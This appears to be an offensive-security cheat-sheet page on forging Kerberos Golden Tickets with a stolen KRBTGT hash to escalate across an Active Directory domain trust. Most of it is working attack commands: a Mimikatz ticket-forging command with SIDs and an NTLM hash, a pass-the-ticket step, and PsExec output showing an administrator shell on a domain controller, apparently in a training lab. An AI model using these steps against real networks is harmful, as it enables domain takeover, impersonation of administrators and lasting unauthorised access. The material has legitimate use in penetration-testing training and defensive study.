---
description: Using krbtgt for abusing domain trust
---

# Krbtgt

## About

When an attacker gains access to the KRBTGT password hash on the domain, it is possible for them to generate their own TGTs \(called “Golden Tickets”\) that are accepted by all the Domain Controllers in the domain since they are signed and encrypted with the domain Kerberos service account data. Simply put, a Golden Ticket is a valid TGT.

## Create TGT

Get krbtgt ticket from DC and create ticket:

```text
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\tickets\krbtgt_tkt.kirbi"'
```

|  |  |
| :--- | :--- |
| **/domain** | FQDN of the current domain |
| **/user** | user to impersonate |
| **/sid** | SID of the current domain |
| **/sids** | sids of the enterprise admins group of the parent domain |
| **/krbtgt** | NTLM hash of krtgt account |
| **/ticket** | path where ticket will be saved |

## Pass The Ticket

On attacker machine \(any machine of the current domain\)

```text
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\tickets\krbtgt_tkt.kirbi"'
```

### Request \(any\) service

E.g. command execution via PsExec

```text
PS C:\AD\Tools> .\PsExec.exe \\mcorp-dc.moneycorp.local\ cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
dollarcorp\administrator

```

